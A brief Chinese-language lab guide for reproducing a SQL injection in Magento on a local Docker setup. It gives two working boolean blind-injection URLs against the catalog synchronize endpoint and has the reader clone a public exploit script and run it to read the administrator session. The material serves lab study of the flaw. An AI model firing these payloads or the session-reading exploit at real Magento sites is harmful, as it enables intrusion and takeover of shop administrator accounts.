开启环境：
```
docker compose up -d
```
访问页面：
```
http://localhost:18080
```
安装Magento时
数据库地址填写mysql
账号密码均为root

安装完后访问链接：
```
http://localhost:18080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-
```

```
http://localhost:18080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-
```
然后去burpsuite查看
两次返回的HTTP状态码不同
一次200，一次400

然后下载一个POC，可以读取到管理员的session：
```
git clone https://github.com/ambionics/magento-exploits.git
```
修改POC的最下面为
```
run('http://localhost:18080')
```
执行即可读取
